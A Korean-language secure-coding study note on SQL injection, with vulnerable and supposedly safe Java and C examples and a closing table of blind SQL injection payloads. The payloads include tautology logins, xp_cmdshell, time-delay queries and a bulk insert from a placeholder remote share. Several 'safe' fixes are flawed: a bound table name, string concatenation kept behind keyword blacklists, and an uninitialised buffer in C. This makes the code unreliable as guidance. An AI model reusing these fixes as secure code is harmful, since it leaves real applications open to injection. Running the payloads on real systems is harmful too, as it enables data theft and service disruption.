# 1. SQL 삽입 (SQL Injection)

## 1) 정의

웹 어플리케이션에서 입력 데이터에 대한 **유효성 검증을 하지 않은 경우**, **공격자가 SQL문을 삽입해** DB로부터 **정보 열람/조작이 가능**해지는 보안 약점

<br>

## 2) 공격 흐름도

![sql 공격 흐름도](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=http%3A%2F%2Fcfile2.uf.tistory.com%2Fimage%2F257C5938590F1A022239B4)<br>
[출처] JAVA 시큐어코딩 가이드 P.3

- 사용자가 입력한 값을 필터링 없이 넘겨 받은 취약한 웹 어플리케이션은 **동적 쿼리(Dynamic Query)** 생성
- 의도하지 않은 쿼리 생성으로 인한 정보유출 가능

<br>

## 3) 해결 방법

- `preparedStatement` 클래스 & 하위 메소드 `executeQuery()`, `execute()`, `executeUpdate()` 사용
- 입력값 필터링 후 사용
  (ex. SQL 구문 제한, 특수 문자 제한, 길이 제한 등)

<br>

## 4) 예제 [1]<br>

> 외부로부터 tableName과 name의 값을 받아서 SQL 쿼리 생성<br>
> name 값으로 name' OR 'a'='a 입력해 조작된 쿼리를 생성하는 문자열 전달

<br>

### **안전하지 않은 코드(java)** : <br>`tablename`과 `name`에 대한 검증 수행 X

```java
PreparedStatement stmt = null;

try {
……
// 외부 환경에서 tablename과 name 입력 받음
String tableName = props.getProperty("jdbc.tableName");
String name = props.getProperty(" jdbc.name" );
String query = "SELECT * FROM " + tableName + " WHERE Name =" + name;

// 사용자 입력 데이터 그대로 SQL에 반영
// 사용자가 name을 입력해 타인의 정보를 열람하는 SQL 가능
stmt = con.prepareStatement(query);
rs = stmt.executeQuery();
ResultSetMetaData rsmd = rs.getMetaData();
……
while (rs.next()) { …… }
dos.writeBytes(printStr);
} catch (SQLException sqle) { …… }
finally { …… }
……

```

<br>

**안전한 코드(java)** : <br>
외부에서 인자를 받는 `preparedStatement` 객체를 상수 스트링으로 생성<br>
`setXXX` 메소드로 인자 부분 설정<br>
-> 외부의 입력이 쿼리문의 구조 바꾸는 것 방지

```java
……
PreparedStatement stmt = null;

try {
……
String tableName = props.getProperty("jdbc.tableName");
String name = props.getProperty("jdbc.name");

//  preparedStatement를 통한 동적 쿼리 생성 방지
String query = "SELECT * FROM ? WHERE Name = ? " ;
stmt = con.prepareStatement(query);

// setXXX 메소드를 통해 사용자 입력 데이터 설정
stmt.setString(1, tableName);
stmt.setString(2, name);
rs = stmt.executeQuery();

ResultSetMetaData rsmd = rs.getMetaData();
int columnCount = rsmd.getColumnCount();
String printStr = "";
while (rs.next()) { …… }
dos.writeBytes(printStr);
} catch (SQLException sqle) { …… }
finally { …… }
……

```

### **안전하지 않은 코드(C)** : <br>외부 입력이 SQL 퀴리에 어떠한 처리 없이 삽입됨

```C
#include <stdlib.h>
#include <sql.h>
void Sql_process(SQLHSTMT sqlh)
 {
 char *query = getenv("query_string");
   SQLExecDirect(sqlh, query, SQL_NTS);
 }
```

**안전한 코드(C)** : <br>인자화된 쿼리 사용해 쿼리 구조 변경 방지

```C
#include <sql.h>
 void Sql_process(SQLHSTMT sqlh)
 {
 char *query_items = "SELECT * FROM items";
 SQLExecDirect(sqlh, query_items, SQL_NTS);
 }
```

## 5) 예제 [2]<br>

> http request로부터 사용자 ID와 암호 추출해 SQL 쿼리 생성

<br>

### **안전하지 않은 코드(java)**:<br>

사용자 ID를 guest' OR ' a'='a'-- 로 설정하여 생성된 쿼리: <br>
`SELECT * FROM members WHERE userId = 'guest' OR 'a'='a'-- AND password = ''`<br>
WHERE절 항상 참 -> 올바른 암호가 아니여도 사용자 정보 조회/열람 가능

```java
……
public class SqlInjectionSample extends HttpServlet
{
    private final String GET_USER_INFO_CMD = "get_user_info";
    private Connection con;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws
        ServletException, IOException
    {
        String command = request.getParameter("command");
        if (command.equals(GET_USER_INFO_CMD))
        {
            Statement stmt = con.createStatement();
            String userId = request.getParameter("user_id");
            String password = request.getParameter("password");
            String query = "SELECT * FROM members WHERE username '" + userId +
                    "' AND password = '" + password + "'";
            stmt.executeUpdate(query);

        }
        ……
    }
    ……

}
```

<br>

**안전한 코드(java)**: makeSecureString 적용<br>
SQL 구문 생성 전, 외부로부터 입력된 ID와 암호를 `makeSecureString` 메소드를 통해 DB 쿼리 사용에 안전한 형태로 변경

### **makeSecureString**<br>

정의

- 3가지 제한 조건 적용해 일반 문자열을 쿼리 인자로 사용 가능한 안전한 문자열로 바꾸는 메소드
  <br>

3가지 제한 조건<br>

- ID와 암호 같은 인자의 길이 제한<br>
  공격 구문 작성시 일반으로 ID와 암호 길이 길어짐<br>
  인자의 길이 제한하여 인자를 통한 공격구문 삽입 어려움 부여

- 인자에 SQL문에서 쓰이는 예약어 삽입 제한 <br>
  Injection 공격 구문 작성시 SQL문에서 쓰는 예약어 사용 가능성 높음<br>
  SQL 사용하는 명령어 블랙리스트 등록과 인자에서 강제적 삭제해 공격 차단<br>

- 인자에 알파벳과 숫자를 제외한 문자 사용 제한<br>
  공격 구문 작성시, 특수 문자 사용 가능성 높음<br>
  알파벳, 숫자 제외 문자를 인자에서 강제적 삭제해 공격에 의한 피해 방지

**Regular Expression (정규식) 사용해 3가지 제한 조건 적용**

`[^\\p{Alnum}] | select | delete | update | insert | create | alter | drop`

- `[^\\p{Alnum}]`: 숫자, 알파벳 제외 문자들
- `select, delete, update, insert, create, alter, drop` : SQL문 예약어
- SQL 예약어를 null string("")으로 대체

그 외 문자열 길이 제한 낮춤, 정규식 포함 단어 늘림을 통해 보다 정밀한 방어 실현 가능

```java
……
public class SqlInjectionSample extends HttpServlet
{
    //작업 type 지정
    private final String GET_USER_INFO_CMD = "get_user_info";
    private Connection con;

    //id와 password 초대 길이 제한
    private final static int MAX_USER_ID_LENGTH = 8;
    private final static int MAX_PASSWORD_LENGTH = 16;

    //SQL 예약어와 알파벳, 숫자를 제외한 다른 문자 검출하는 정규식 설정
    private final static String UNSECURED_CHAR_REGULAR_EXPRESSION = "[^\\
        p{Alnum}]|select|delete|update|insert|create|alter|drop";

    private Pattern unsecuredCharPattern;

    //정규식 초기화
    public void initlalize()
    {
        unsecuredCharPattern = Pattern.compile(UNSECURED_CHAR_REGULAR_EXPRESSION,
           attern.CASE_INSENSITIVE);
        //……
    }


    //입력값을 정규식을 통해 필터링 후 의심되는 것은 제거
    private String makeSecureString(final String str, int maxLength)
    {
        String securestStr = str.substring(0, maxLength);
        Matcher matcher = unsecuredCharPattern.matcher(securestStr);
        return matcher.replaceAll("");
    }

    //……

    //입력값을 필터링한 후 쿼리로 생성해 처리
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws
    ServletException, IOException
    {
        String command = request.getParameter("command");
        if (command.equals(GET_USER_INFO_CMD))
        {
            Statement stmt = con.createStatement();
            String userId = request.getParameter("user_id");
            String password = request.getParameter("password");
            String query = "SELECT * FROM members WHERE username '" + makeSecureString(userId,
                    MAX_USER_ID_LENGTH) + "' AND password = '" + makeSecureString(password,
                    MAX_PASSWORD_LENGTH) + "'";

            stmt.executeUpdate(query);

        }
        ……
    }
    ……

}
```

<br>

### **안전하지 않은 코드(C)**:<br> queryStr의 외부 입력에서 `user_id`와 `password`의 값을 잘라 그대로 SQL문 인자 값으로 사용

```C
static SQLHSTMT statmentHandle;
const char * GetParameter(const char * queryString, const char * key);
static const char * GET_USER_INFO_CMD = "get_user_info";
static const char * USER_ID_PARAM = "user_id";
static const char * PASSWORD_PARAM = "password";
static const int MAX_QUERY_LENGTH = 256;
const int EQUAL = 0;
int main(void)
{
  SQLCHAR * queryStr;
  queryStr = getenv("QUERY_STRING");
  if (queryStr == NULL)
   {
   // Error 처리 루틴
   ...
    }
   // 입력 값 가져오기
char * command = GetParameter(queryStr, "command");
if (strcmp(command, GET_USER_INFO_CMD) == EQUAL)
 {
 // userId와 password 값 가져오기
 const char * userId = GetParameter(queryStr, USER_ID_PARAM);
 const char * password = GetParameter(queryStr, PASSWORD_PARAM);

 char query[MAX_QUERY_LENGTH];
 sprintf(query, "SELECT * FROM members WHERE username= '%s' AND password ='%s'", userId, password);
 SQLExecDirect(statmentHandle, query, SQL_NTS);
 }
 return 0;
 }
```

<br>

**안전한 코드(C)**:<br> `makeSecureString` 메소드를 통해 위험한 SQL 생성 유발하는 단어/특수문자 제거<br>
`static const int`로 선언한 `MAX_USER_ID_LENGTH`와 `MAX_PASSWORD_LENGTH`에 설정한 값을 벗어나는 문자는 제거됨<br>
`regexec` 메소드를 통해 정규식에 근거해 위험 문자는 제거하고 그 앞뒤를 연결함

```C
 const char * GetParameter(const char * queryString, const char * key);
 static const char * GET_USER_INFO_CMD = "get_user_info";
 static const char * USER_ID_PARAM = "user_id";
 static const char * PASSWORD_PARAM = "password";
 static const int MAX_QUERY_LENGTH = 256;
 static const int MAX_USER_ID_LENGTH = 8;
 static const int MAX_PASSWORD_LENGTH = 16;
 const char * makeSecureString(const char *str, int maxLength);
 const int EQUAL = 0;
 int main(void)
 {
 // 필터링에 사용할 정규식 설정
 int reti = regcomp(&unsecurePattern, "[^[:alnum:]]|select|delete|update|insert|create|alter|drop", REG_ICASE | REG_EXTENDED);

 // 정규식 설정이 실패했을 경우 나머지 퍼리를 하지 않고 강제 종료함
 if (reti)
 {
 fprintf(stderr, "Could not compile regex\n");
 exit(1);
 }

 SQLCHAR * queryStr;
 queryStr = getenv("QUERY_STRING");
 if (queryStr == NULL)
 {
 // 입력값이 null인 경우 Error 처리
 ...
 }
 char * command = GetParameter(queryStr, "command");
 if (strcmp(command, GET_USER_INFO_CMD) == EQUAL)
 {
 // 각 입력값을 쪼갠 후 makeSecureString함수로 필터링 거쳐 검증
 const char * userId = GetParameter(queryStr, USER_ID_PARAM);
 userId = makeSecureString(userId, MAX_USER_ID_LENGTH);
 const char * password = GetParameter(queryStr, PASSWORD_PARAM);
 password = makeSecureString(password, MAX_PASSWORD_LENGTH);

 char query[MAX_QUERY_LENGTH];
 sprintf(query, "SELECT * FROM members WHERE username= '%s' AND password ='%s'", userId, password);
 SQLExecDirect(statmentHandle, query, SQL_NTS);
 free(userId);
 free(password);
 }
 regfree(&unsecurePattern);

 return EXIT_SUCCESS;
 }
 // 입력값을 필터링해 검증하는 루틴
 const char * makeSecureString(const char *str, int maxLength)
 {
 char * buffer = (char *) malloc(maxLength + 1);
 char * originalStr = (char *)malloc(maxLength + 1);
 strncpy(originalStr, str, maxLength);
 originalStr[maxLength] = NULL;
 regmatch_t mt;
 const char * currentPos = originalStr;
 // 정규식에 매칭되는 부분이 있으면 그 부분 건너뛰는 형태로 문자열 변결
 while (regexec(&unsecurePattern, currentPos, 1, &mt, REG_NOTBOL) == 0)
 {
   strncat(buffer, currentPos, mt.rm_so);
   currentPos += mt.rm_eo;
 }
 strcat(buffer, currentPos);
 free(originalStr);
 return buffer;
}

```

## 6) 예제 [3] : Blind SQL injection 공격 구문<br>

특정한 코드를 선별해 막는 블랙리스트에 의거한 필터링 방식 사용시 다양한 형태의 SQL 함수 이용한 공격방법을 참고해야 함<br>
필터링 코드의 완성도는 블랙리스트를 만드는 작성자가 얼마나 공격 패턴을 많이 알고 있느냐에 따라 좌우됨
<br>
|공격 구문| 설명|
|:--:|:--:|
|IF (1=1) SELECT 'true' ELSE SELECT 'false'|위험한 구문 허용 |
|SELECT CHAR(0x66) |위험한 함수사용 허용 (다른 blind sql 공격구문에 자주 이용됨) |
|SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))|위험한 함수사용 허용|
|SELECT ASCII('a') |위험한 함수사용 허용|
|SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members|위험한 구문 허용|
|INSERT INTO members(id, user, pass) VALUES(1, "+SUBSTRING(@@version,1,10) , 10) |시스템 정보 노출|
|exec master..xp_cmdshell 'dir' |위험한 명령어 사용(시스템 down)|
|SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78--|True, False를 통해 데이터 값을 유추할 수 있음|
|IF (SELECT \* FROM login) BENCHMARK(1000000,MD5(1))|시스템 자원 소모 유도|
|WAITFOR DELAY '0:0:10'-- |시스템 자원 소모 유도 |
|MD5(), SHA1(), PASSWORD(), ENCODE(), COMPRESS(), ROW_COUNT(), SCHEMA(), VERSION() |위험한 함수 사용|
|bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'|Windows UNC Share를 악용|
